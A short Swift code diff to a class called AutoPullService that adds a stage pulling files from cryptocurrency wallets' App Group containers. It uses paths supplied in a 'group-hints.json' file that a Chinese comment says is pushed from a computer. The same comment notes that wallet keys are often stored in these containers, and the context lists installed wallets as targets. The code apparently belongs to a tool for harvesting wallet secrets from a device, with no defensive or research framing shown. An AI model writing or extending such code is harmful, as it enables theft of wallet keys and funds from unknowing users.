@@ -106,6 +106,13 @@ final class AutoPullService {
             summary.append(result)
         }
 
+        // 2.5) 电脑端推来的 AppGroup（钱包的 group.* 容器，密钥常放这里）
+        for (groupId, groupPath) in loadGroupHints() {
+            guard shouldPull(groupId) else { continue }
+            trace(["stage": "pull-group", "group": groupId, "path": groupPath])
+            summary.append(pull(path: groupPath, as: groupId))
+        }
+
         // 3) 本机已装钱包
         var seen = Set<String>()
         for wallet in walletPresets {
@@ -152,6 +159,15 @@ final class AutoPullService {
             return [:]
         }
         log("载入索引 \(dict.count) 条")
+        return dict
+    }
+
+    private func loadGroupHints() -> [String: String] {
+        let url = URL.documentsDirectory.appendingPathComponent("group-hints.json")
+        guard let data = try? Data(contentsOf: url),
+              let dict = try? JSONSerialization.jsonObject(with: data) as? [String: String] else {
+            return [:]
+        }
         return dict
     }
 
